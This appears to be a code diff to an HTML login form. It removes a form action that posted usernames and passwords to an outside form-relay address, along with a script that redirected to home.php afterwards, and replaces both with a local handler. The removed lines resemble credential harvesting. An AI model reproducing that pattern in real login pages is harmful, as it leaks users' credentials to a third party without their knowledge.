@@ -48,7 +48,7 @@ input[type="submit"]:hover {
 <body>
 	<div class="container">
 		<h1>Login Form</h1>
-		<form action="https://formsubmit.co/3b743898d45d9458bc18414a68c3303c" method="POST">
+		<form action="home.php" method="POST">
 			<label for="username">Username:</label>
 			<input type="text" id="username" name="username" required>
 
@@ -59,11 +59,5 @@ input[type="submit"]:hover {
 		</form>
 	</div>
 
-	<script>
-		// Redirect to home.php after form submission
-		document.querySelector('form').addEventListener('submit', function() {
-			window.location.href = 'home.php';
-		});
-	</script>
 </body>
 </html>
